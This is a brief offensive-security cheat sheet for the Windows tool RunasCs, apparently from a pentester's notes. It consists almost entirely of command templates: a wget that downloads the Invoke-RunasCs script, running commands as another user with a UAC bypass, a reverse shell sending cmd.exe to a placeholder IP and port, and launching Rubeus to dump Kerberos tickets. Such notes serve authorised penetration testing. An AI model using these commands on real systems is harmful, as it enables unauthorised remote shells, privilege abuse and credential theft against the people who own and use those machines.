# RunAsCs

% windows, RunAsCs

#plateform/windows #target/remote  #cat/RECON

## Download
```powershell
wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -O Invoke-RunasCs.ps1
```


##  run as
```powershell
RunAsCs.exe -UserName <user> -Password '<password>' -Domain <domain_fqdn> -LogonType <logon_type|2> -BypassUac -Command "cmd /c klist" 
```

## Reverse shell  
```powershell
RunAsCs.exe -UserName <user> -Password '<password>' -Domain <domain_fqdn> -LogonType <logon_type|2> -BypassUac -Command cmd.exe -Remote <ip>:<port> 
```

## dump certificates (Rubeus)
```powershell
RunAsCs.exe -UserName <user> -Password '<password>' -Domain <domain_fqdn> -LogonType <logon_type|2> -BypassUac  -Command "c:\users\jubeaz\Documents\Rubeus.exe dump /nowrap"
```
